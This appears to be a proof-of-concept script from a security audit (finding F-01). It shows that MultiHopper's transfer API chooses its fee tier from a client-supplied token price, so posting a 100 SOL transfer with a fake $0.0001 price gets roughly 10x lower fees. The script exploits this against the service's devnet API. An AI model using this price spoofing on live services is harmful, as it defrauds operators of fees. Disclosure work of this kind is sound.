// F-01 — Protocol percentage-fee tier is selected from the client-supplied
// `tokenPriceUsd` with no oracle validation, allowing ~10x fee underpayment.
//
// The fee tier (standard 5 bps vs premium 50 bps) is chosen from
// usdEquivalent = amount * tokenPriceUsd. `tokenPriceUsd` is caller-controlled.
// Declaring a tiny price keeps a high-value transfer in the cheap "standard"
// tier. This holds even for native SOL, despite docs stating SOL uses backend
// CoinGecko spot pricing — so the percentage fee MultiHopper collects is
// attacker-controlled. Demonstrated end-to-end at POST /transfers (persisted).
//
// Run:  MH_API_KEY=mh_test_... node 01-fee-tier-bypass.mjs
//   (or no env var — it self-provisions a devnet key, no SOL needed)
import { rest, provisionApiKey, section, line, verdict } from "./_lib.mjs";

const { key } = await provisionApiKey();
const SOL = "So11111111111111111111111111111111111111112";
const ME = "Do9uGrChvHDH2xfvsFNF1MNHGMnMRhiX5g5mpyHoQLLr";
const RECIP = "Vote111111111111111111111111111111111111111";
const u = () => "fee-" + Math.random().toString(36).slice(2) + Date.now();
const sleep = (ms) => new Promise((z) => setTimeout(z, ms));

async function createSol(priceUsd) {
  const r = await rest("/transfers", { method: "POST", apiKey: key, idem: u(), body: {
    tokenMint: SOL, tokenSymbol: "SOL", tokenDecimals: 9,
    amountRaw: "100000000000", amountTokens: "100", // 100 SOL
    sourceOwner: ME, recipientWallet: RECIP, hops: 3, tokenPriceUsd: priceUsd } });
  return r.body;
}

section("Create the SAME 100 SOL transfer with an honest vs a lied-about price");
const honest = await createSol(200);      // ~$20,000 -> should be premium
await sleep(1500);
const lied = await createSol(0.0001);     // declared ~$0.01 -> gets standard

line(`honest  price=$200     -> tier=${honest.pricingTier}  feeBps=${honest.percentFeeBps}  feeRaw=${honest.percentFeeRaw}  recipientReceivesRaw=${honest.recipientReceivesRaw}`);
line(`spoofed price=$0.0001  -> tier=${lied.pricingTier}  feeBps=${lied.percentFeeBps}  feeRaw=${lied.percentFeeRaw}  recipientReceivesRaw=${lied.recipientReceivesRaw}`);

const ratio = Number(honest.percentFeeRaw) / Number(lied.percentFeeRaw || 1);
line(`\nfee underpayment factor: ${ratio.toFixed(1)}x  (protocol collects ${ratio.toFixed(1)}x less on the spoofed transfer)`);

const vuln = lied.pricingTier === "standard" && honest.pricingTier === "premium" && ratio >= 5;
section("VERDICT");
verdict(vuln, "identical 100 SOL transfer pays " + honest.percentFeeBps + "bps vs " + lied.percentFeeBps + "bps depending on a client-supplied price field");
process.exit(vuln ? 0 : 1);
